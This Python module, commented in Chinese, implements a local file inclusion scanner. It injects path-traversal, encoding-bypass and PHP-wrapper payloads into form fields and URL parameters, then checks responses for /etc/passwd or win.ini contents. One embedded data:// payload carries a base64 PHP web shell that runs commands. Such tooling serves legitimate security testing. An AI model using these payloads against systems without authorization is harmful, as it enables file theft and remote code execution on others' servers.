#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
LFI（本地文件包含）扫描器模块，负责扫描LFI漏洞
"""

import re
import logging
import random
import string
import os
from urllib.parse import urlparse, urlencode, parse_qsl, unquote

logger = logging.getLogger('xss_scanner')

class LFIScanner:
    """LFI扫描器类，负责扫描本地文件包含漏洞"""
    
    def __init__(self, http_client):
        """
        初始化LFI扫描器
        
        Args:
            http_client: HTTP客户端对象
        """
        self.http_client = http_client
        
        # LFI检测Payload
        self.payloads = [
            # 基本路径遍历
            "../../../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../etc/passwd",
            "../etc/passwd",
            
            # Windows系统文件
            "../../../../../../../windows/win.ini",
            "../../../../../../windows/win.ini",
            "../../../../../windows/win.ini",
            "../../../../windows/win.ini",
            "../../../windows/win.ini",
            "../../windows/win.ini",
            "../windows/win.ini",
            
            # URL编码绕过
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",
            
            # 空字节截断 (仅适用于某些PHP版本)
            "../../../../../../../etc/passwd%00",
            "../../../../../../../etc/passwd\0",
            
            # 双重URL编码
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            
            # 使用斜杠绕过
            "....//....//....//etc/passwd",
            "..././..././..././etc/passwd",
            
            # 使用过滤器包装器 (PHP)
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ZWNobyAiU3VjY2VzcyI7Pz4=",
            "expect://id",
            
            # 使用伪协议
            "file:///etc/passwd",
            "file:///../../../etc/passwd",
            
            # 路径参数污染
            "file.php?path=/etc/passwd",
            "file.php?path=../../../etc/passwd",
            
            # 向后兼容绕过
            "/..././..././..././etc/passwd",
            
            # 绝对路径
            "/etc/passwd",
            "c:\\windows\\win.ini",
            
            # 嵌套的遍历序列
            "....//....//....//etc/passwd",
            "../....//....//etc/passwd",
            
            # 特殊字符绕过
            "..%252f..%252f..%252fetc%252fpasswd",
            
            # Null字节混淆
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd\0.jpg",
            
            # Unicode / UTF-8编码
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/etc/passwd"
        ]
        
        # LFI成功检测模式
        self.unix_patterns = [
            # /etc/passwd文件内容特征
            "root:.*:0:0:",
            "bin:.*:1:1:",
            "daemon:.*:2:2:",
            "ftpuser:.*:.",
            "rsh",
            "ssh",
            ".*usr.*bin.*\n"
        ]
        
        self.windows_patterns = [
            # Windows系统文件特征
            "\\[extensions\\]",
            "\\[mci extensions\\]",
            "\\[fonts\\]",
            "\\[files\\]",
            "MAPI=1",
            "mail=",
            "\\[Mail\\]",
            "\\[MCI Extensions\\]"
        ]
        
        # PHP错误模式 (可能表明有漏洞，但需要进一步利用)
        self.php_error_patterns = [
            "failed to open stream: No such file or directory",
            "failed to open stream: Permission denied",
            "Failed opening required",
            "Warning: include\\(",
            "Warning: require_once\\(",
            "Warning: require\\(",
            "Warning: include_once\\("
        ]
    
    def scan_form(self, url, form, field):
        """
        扫描表单中的LFI漏洞
        
        Args:
            url: 页面URL
            form: 表单信息
            field: 字段信息
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        if not field.get('name'):
            return None
            
        # 可能存在LFI的字段名称
        lfi_prone_fields = [
            'file', 'path', 'page', 'document', 'folder', 'root', 'path',
            'pg', 'style', 'pdf', 'template', 'php_path', 'doc', 'include'
        ]
        
        # 如果字段名不包含敏感关键词，则跳过扫描
        field_name_lower = field['name'].lower()
        if not any(keyword in field_name_lower for keyword in lfi_prone_fields):
            return None
            
        logger.debug(f"扫描LFI: {field['name']} @ {url}")
        
        # 获取表单提交URL
        action_url = form['action'] if form['action'] else url
        
        # 获取表单方法
        method = form['method'].upper()
        
        # 检测LFI漏洞
        for payload in self.payloads:
            # 构建表单数据
            form_data = {}
            
            # 填充所有字段
            for f in form.get('fields', []):
                if f.get('name'):
                    # 如果是目标字段，则使用Payload
                    if f['name'] == field['name']:
                        form_data[f['name']] = payload
                    else:
                        # 否则使用默认值
                        form_data[f['name']] = f.get('value', '')
            
            # 发送请求
            try:
                logger.debug(f"测试Payload: {payload}")
                
                if method == 'POST':
                    response = self.http_client.post(action_url, data=form_data)
                else:
                    response = self.http_client.get(action_url, params=form_data)
                    
                if not response:
                    continue
                    
                # 检查响应中是否包含文件内容特征
                if self._check_lfi_success(response.text):
                    return {
                        'type': 'LFI',
                        'url': url,
                        'form_action': action_url,
                        'form_method': method,
                        'parameter': field['name'],
                        'payload': payload,
                        'severity': '高',
                        'description': f"在表单字段'{field['name']}'中发现本地文件包含(LFI)漏洞",
                        'details': f"表单提交到{action_url}的{field['name']}字段存在LFI漏洞，可以读取服务器上的敏感文件",
                        'recommendation': "避免将用户输入直接传递给文件系统操作，实施白名单验证，使用间接引用"
                    }
            except Exception as e:
                logger.error(f"扫描LFI时发生错误: {str(e)}")
                
        return None
    
    def scan_parameter(self, url, param):
        """
        扫描URL参数中的LFI漏洞
        
        Args:
            url: 页面URL
            param: 参数名
            
        Returns:
            dict: 漏洞信息，如果没有发现漏洞则返回None
        """
        # 可能存在LFI的参数名称
        lfi_prone_params = [
            'file', 'path', 'page', 'document', 'folder', 'root', 'path',
            'pg', 'style', 'pdf', 'template', 'php_path', 'doc', 'include'
        ]
        
        # 如果参数名不包含敏感关键词，则跳过扫描
        param_lower = param.lower()
        if not any(keyword in param_lower for keyword in lfi_prone_params):
            return None
            
        logger.debug(f"扫描LFI参数: {param} @ {url}")
        
        # 解析URL
        parsed_url = urlparse(url)
        
        # 获取查询参数
        query_params = dict(parse_qsl(parsed_url.query))
        
        # 如果参数不存在，则添加
        if param not in query_params:
            query_params[param] = ""
            
        # 构建基础URL
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # 检测LFI漏洞
        for payload in self.payloads:
            # 构建注入参数
            inject_params = query_params.copy()
            inject_params[param] = payload
            
            # 构建测试URL
            query_string = urlencode(inject_params)
            test_url = f"{base_url}?{query_string}"
            
            try:
                logger.debug(f"测试Payload: {payload}")
                
                # 发送请求
                response = self.http_client.get(test_url)
                if not response:
                    continue
                    
                # 检查响应中是否包含文件内容特征
                if self._check_lfi_success(response.text):
                    return {
                        'type': 'LFI',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'severity': '高',
                        'description': f"在URL参数'{param}'中发现本地文件包含(LFI)漏洞",
                        'details': f"URL参数{param}存在LFI漏洞，可以读取服务器上的敏感文件",
                        'recommendation': "避免将用户输入直接传递给文件系统操作，实施白名单验证，使用间接引用"
                    }
            except Exception as e:
                logger.error(f"扫描LFI参数时发生错误: {str(e)}")
                
        return None
    
    def _check_lfi_success(self, content):
        """
        检查响应内容中是否包含LFI成功的特征
        
        Args:
            content: 响应内容
            
        Returns:
            bool: 是否包含LFI成功特征
        """
        if not content:
            return False
            
        # 检查Unix系统文件特征
        for pattern in self.unix_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
                
        # 检查Windows系统文件特征
        for pattern in self.windows_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        # 检查PHP错误信息特征
        # 注意：这需要进一步的验证，因为错误信息可能只是表明有漏洞，但未被成功利用
        for pattern in self.php_error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                # 检查是否同时包含敏感信息，如路径
                if re.search("/(var|etc|usr|opt|home)/", content):
                    return True
                if re.search("([A-Za-z]:\\\\|System32|Program Files)", content):
                    return True
                
        return False
    
    def can_scan_form(self):
        """是否可以扫描表单"""
        return True
    
    def can_scan_params(self):
        """是否可以扫描URL参数"""
        return True 